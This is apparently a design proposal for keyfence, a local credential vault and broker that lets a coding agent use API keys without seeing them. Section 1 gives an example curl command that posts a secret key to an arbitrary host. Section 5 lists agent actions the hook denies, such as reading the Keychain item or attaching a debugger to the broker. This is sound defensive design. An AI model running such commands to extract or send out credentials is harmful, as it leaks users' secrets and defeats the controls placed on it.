# keyfence vault: design proposal

Status: phase 1 implemented in 0.3.0 (vault, policy, `keyfence secret`, hook
protection of vault values); phases 2 to 4 proposed. Scope: the smallest evolution of keyfence
0.2.0 that turns it into a local credential vault with policies and an execution
API, without ever returning plaintext to an agent.

## 1. Where keyfence is today

```
bin/keyfence.js        CLI: scan, rules, install, config
bin/keyfence-hook.js   Claude Code hook entry
src/detect.js          detection: 53 provider rules, labeled values, entropy
src/rules.js           provider rules
src/hook.js            UserPromptSubmit / PreToolUse / PostToolUse
src/capture.js         saves a pasted value to .env (plaintext, 0600)
src/config.js          ~/.config/keyfence/config.json
src/jev.js             optional classifier, sees shapes only
state                  per-session file of SHA-256 prefixes in the OS temp dir
```

What 0.2.0 already does well, and stays:

- detection of credentials in prompts and tool output;
- taint by hash and egress denial (network, commits, MCP, code, tracked files);
- vault-file read denial (`.env`, credentials, SSH keys);
- output cleaning: a known value is replaced by its name before the agent sees it.

What 0.2.0 cannot do, and why a vault is needed:

1. **The value lives in the agent's shell.** Capture mode injects `.env` into
   the agent's Bash command. The command runs with the plaintext in its
   environment, so `curl -d "$STRIPE_SECRET_KEY" https://anywhere` is allowed:
   keyfence guards the literal value, not the destination.
2. **Storage is plaintext.** `.env` and `secrets.env` are `0600`, not encrypted.
3. **No policy.** Any command can use any captured variable, for any host.
4. **Some tasks cannot be done at all** without the agent handling the value:
   typing a SIP token into a web form, for example.

The vault fixes all four by moving the value out of the agent's process: the
agent asks for an operation by alias, and keyfence performs it.

## 2. Threat model, stated plainly

The agent runs as your OS user with a shell. Anything your user can do, the
agent can try. So there are two levels of protection, and this design names
which one each phase gives:

| Level | Protects against | How |
|---|---|---|
| **Guarded** (phases 1 to 3) | accidents, careless automation, prompt injection that does not target keyfence | the value never enters the agent's context, commands or output; the hook denies the obvious paths to the vault (reading its files, the Keychain item, the broker's internals) |
| **Isolated** (phase 4) | an agent actively trying to extract the value | the broker runs as a separate OS user; your user, and so the agent, cannot read the vault files or the key at all |

Phases 1 to 3 are a large improvement over today and cover keyfence's current
threat model. Phase 4 is what makes it a hard boundary. The API is designed for
phase 4 from day one, so moving there is a deployment change, not a rewrite.

## 3. Vault

### Storage

```
~/.config/keyfence/vault/
  vault.json       metadata, policies and encrypted values (0600)
  audit.log        append-only JSON lines, hash-chained (0600)
```

- Each value is encrypted with **AES-256-GCM** (`node:crypto`, no dependency),
  a random 96-bit nonce per write, and the alias plus version as associated
  data, so a ciphertext cannot be moved to another alias.
- **Master key**: 32 random bytes stored as one generic password in the macOS
  Keychain (`security add-generic-password`, service `keyfence-vault`). Read only
  by the broker. On Linux: libsecret (`secret-tool`) or, without it, a key
  derived with scrypt from a passphrase given at `keyfence unlock`.
- Metadata stays readable by the tools: alias, environment, fields, policy,
  created/rotated/last-used times, version, status and a salted fingerprint.
  Metadata can be listed; values cannot.

### Record

```yaml
alias: wavoip/test-device/sip          # namespace/service/name
environment: test                      # dev | test | prod
fields:                                # one secret can hold several fields
  token: <encrypted>
status: active                         # active | revoked
version: 3                             # previous version kept until purged
exposed: false                         # true if it ever passed through a chat
policy:
  operations: [browser.fill]
  targets: [call.otonistark.com.br]
  fill_map: { username: token, password: token }
  projects: [/Volumes/Code/call]       # optional: only sessions under these paths
  expires: 2026-12-31                  # optional
```

The Wavoip case is one field (`token`) mapped to two form fields. That is why
`fill_map` exists instead of assuming `username` and `password` are separate.

### Lifecycle

| Command | Does | Value handling |
|---|---|---|
| `keyfence secret add <alias>` | creates a secret, asks for policy | typed at a hidden TTY prompt; never an argument |
| `keyfence secret list [ns]` | metadata table | no values |
| `keyfence secret show <alias>` | metadata, policy, last uses | no value, ever |
| `keyfence secret rotate <alias>` | new version, old one kept | hidden TTY prompt |
| `keyfence secret revoke <alias>` | status revoked, effective on the next request | none |
| `keyfence secret rm <alias>` | deletes all versions | none |
| `keyfence secret policy <alias>` | edits the policy | none |

There is deliberately no `get`, `reveal` or `export`. A human who needs the value
reads it from the provider or rotates it.

`add` and `rotate` need a real terminal. Agents do not have one, which makes
"only a human adds secrets" a property of the design, not a rule to remember.

## 4. Broker (the execution API)

A long-running process started by launchd, listening on a **Unix socket**
(`~/.config/keyfence/run/keyfence.sock`, `0600`). Not TCP on localhost: any
local process, and any web page through DNS rebinding, can reach localhost; a
Unix socket is reachable only through file permissions, and in phase 4 through
a group the agent's user is not in.

Every request goes through the same pipeline:

```
parse -> resolve alias -> check status -> check policy (operation, target,
environment, project, expiry) -> decrypt field(s) -> execute -> scrub result ->
audit -> respond
```

### Operations

**`POST /v1/request`**: authenticated HTTP made by keyfence.

```json
{ "secret": "billing/api",
  "request": { "method": "POST", "url": "https://api.exemplo.com/resource",
               "auth": "bearer", "body": { "name": "x" } } }
```

- `https` only; host must match `policy.targets` exactly (or an explicit
  `*.domain` entry). IP literals and private ranges are refused unless allowed.
- Redirects are not followed automatically; each hop is re-checked.
- Auth schemes: `bearer`, `basic`, `header:<Name>`, `query:<name>`. The caller
  cannot choose which header carries the value beyond what the policy allows.
- Response returned: status, an allowlist of headers, body up to a size cap,
  **scrubbed** (see section 6).

**`POST /v1/use`** (`keyfence run`): runs a local command with the secret.

```json
{ "secret": "project-x/database", "command": ["npm", "run", "migrate"],
  "inject": { "env": { "DATABASE_URL": "url" } } }
```

- The command's program must be in `policy.commands` (exact names, never a
  shell or an interpreter with `-e`/`-c`: those would let the caller print the
  value).
- Injection order of preference: **stdin or a file descriptor** when the tool
  supports it (`--password-stdin`), then **environment**, never argv (argv is
  visible to every user in `ps`). Environment is visible to your own user's
  processes on macOS, which is acceptable in the guarded level and gone in the
  isolated level.
- stdout and stderr are scrubbed before they are returned.

**`POST /v1/fill`**: types a secret into a browser form.

```json
{ "secret": "wavoip/test-device/sip",
  "target": { "type": "browser", "domain": "call.otonistark.com.br",
              "fields": { "username": "#sip-username", "password": "#sip-password" } } }
```

- keyfence attaches to the running Chrome through the DevTools protocol, the
  same channel `chrome-devtools-axi` uses, finds the tab, and **checks the
  frame's origin** equals the allowed domain at the moment of typing (not the
  one the caller claims).
- It sets each field and dispatches the input events frameworks listen to. It
  never touches the clipboard.
- Returns `{ "success": true, "fields_filled": ["username", "password"] }`.
  Clicking Save stays with the agent, which keeps `fill` narrow.
- The DevTools client needs a WebSocket: Node 22 has one built in; on Node 18
  and 20 keyfence ships a minimal client (the protocol subset is small).

**Discovery**: `GET /v1/secrets` returns aliases, environment, operations and
targets, so the agent can see that `wavoip/test-device/sip` exists and what it
allows. Never values.

### Client

```
keyfence request <alias> --url https://... [--method POST] [--body @file.json]
keyfence run <alias> -- npm run migrate
keyfence fill <alias> --domain call.otonistark.com.br --field username=#u --field password=#p
keyfence secrets
```

A CLI first, in keyfence's existing AXI style: it costs no context until it is
called, and any automation can use it. An MCP server that wraps the same socket
can come later if structured tool calls prove worth their schema cost.

### `.env` references

```
DATABASE_URL=keyfence://project-x/database#url
CALL_API_KEY=keyfence://call/api
```

`keyfence run -- <cmd>` reads the project's `.env`, resolves every `keyfence://`
reference through the broker (policy applies: the project path and the command
must be allowed), and starts `<cmd>` with the resolved environment. This is the
pattern of `op run` (1Password) and `doppler run`. The `.env` becomes safe to
read, and even to commit.

The hook's current injection (`set -a; . .env`) switches to `keyfence run --`
when `.env` holds references, so the agent keeps writing `$DATABASE_URL`.

## 5. What changes in the hook

- **Vault values are tainted from the start.** The broker publishes the salted
  fingerprint of every active value to a file the hook reads. Output cleaning and
  egress denial then cover every vault secret in every session, even one never
  seen in a prompt: if a page, an API or a log shows the SIP token, the agent
  receives `⟨wavoip/test-device/sip⟩`.
- **The vault is a guarded path.** Denied to the agent: reading
  `~/.config/keyfence/vault/`, `security find-generic-password -s keyfence-vault`,
  loading `src/vault.js` from `node -e`, attaching a debugger to the broker,
  reading the broker's environment.
- **Capture feeds the vault.** With `capture.target: "vault"`, a pasted value
  becomes `inbox/<name>` with `exposed: true` and a starter policy derived from
  its provider (a Meta token allows `request` to `graph.facebook.com` from the
  current project). The agent is told the alias. Since the value already passed
  through the chat, `keyfence secret list` flags it for rotation.

## 6. Leak protection inside keyfence

- **Scrubber on every exit**: responses, command output, error messages, audit
  lines and crash output pass through a scrubber that knows every decrypted value
  of the request, in raw, base64, base64url, URL-encoded and JSON-escaped forms,
  plus the existing detector.
- **Errors are generic**: callers get an error code and a request id; details go
  to the audit log, scrubbed. No stack traces cross the socket.
- **Short life in memory**: decrypted values live in `Buffer`s, are used and
  overwritten with zeros after the operation. JavaScript strings cannot be wiped,
  so values are never converted to strings except at the last step that needs
  one (an HTTP header, an env var), and that string is dropped immediately.
- **No core dumps**: the launchd job sets `HardResourceLimits.Core = 0`.

## 7. Audit

One JSON line per request: time, alias, version, operation, target, caller
(session id, working directory, pid), decision, reason, duration, bytes out.
Never the value, never the request body. Each line carries the hash of the
previous one, so an edited or deleted line is detectable with
`keyfence audit verify`.

## 8. Phases

| Phase | Delivers | New files | Changed files |
|---|---|---|---|
| **1. Vault** | encrypted store, Keychain key, `secret add/list/show/rotate/revoke/rm/policy`, vault fingerprints in the hook | `src/vault.js`, `src/policy.js` | `src/cli.js`, `src/hook.js`, `src/config.js` |
| **2. Broker** | socket server, `request`, `run`/`use`, audit, `keyfence://` in `.env`, `capture.target: "vault"` | `src/broker.js`, `src/ops/request.js`, `src/ops/run.js`, `src/audit.js`, `src/scrub.js` | `src/capture.js`, `src/hook.js`, `src/cli.js` |
| **3. Fill** | `fill` over the DevTools protocol, origin check | `src/ops/fill.js` | `src/cli.js` |
| **4. Isolation** | broker as a separate macOS user (LaunchDaemon), socket group, vault files owned by it | installer only | `keyfence install` |

The Wavoip SIP case needs phases 1 to 3. Phases 1 and 2 already remove plaintext
from `.env` files and let the agent call authenticated APIs without the key.

Everything in 0.2.0 stays: detection, taint, egress denial, vault-file denial,
output cleaning and capture to `.env` for users who do not enable the vault.

## 9. Limits that remain, even with the vault

- **A value typed into a page can be shown by that page.** If the Call admin
  later displays the SIP password, a DOM read returns it. Output cleaning hides
  it in text; a **screenshot** is not text and is not cleaned.
- **An allowed destination can echo.** `request` to an allowed host that
  reflects the Authorization header returns it; the scrubber catches the exact
  value and its common encodings, not arbitrary transformations.
- **`run` hands plaintext to the child by design.** The command allowlist is the
  control; a broad entry (`bash`, `node`, `python`) would defeat it, so policy
  validation refuses shells and interpreters.
- **Before phase 4, the boundary is guarded, not isolated** (section 2).
- **A secret pasted in the chat reached the model once.** The vault makes every
  later step safe; it cannot undo that. Adding secrets through
  `keyfence secret add` in a terminal is the zero-exposure path.

## 10. Decisions taken, and the alternatives set aside

| Decision | Alternative set aside | Why |
|---|---|---|
| One encrypted file, key in Keychain | one Keychain item per secret | policies, versions and audit need one consistent store; Keychain ACLs by app are weak for a `node` binary anyway |
| Unix socket | HTTP on localhost | localhost is reachable by every local process and by browsers via DNS rebinding |
| No `get` endpoint at all | `get` restricted to "trusted" callers | any trusted-caller rule is bypassable by the same user; the cleanest guarantee is that the code path does not exist |
| CLI first, MCP later | MCP first | zero context cost until used; usable by any automation, not only Claude Code |
| DevTools protocol for `fill` | clipboard paste, AppleScript keystrokes | clipboard is readable by every app; keystrokes cannot verify the page's origin |
| `node:crypto` AES-GCM | libsodium, age | zero dependencies is a keyfence property; GCM with a random nonce per write is sound at this volume |
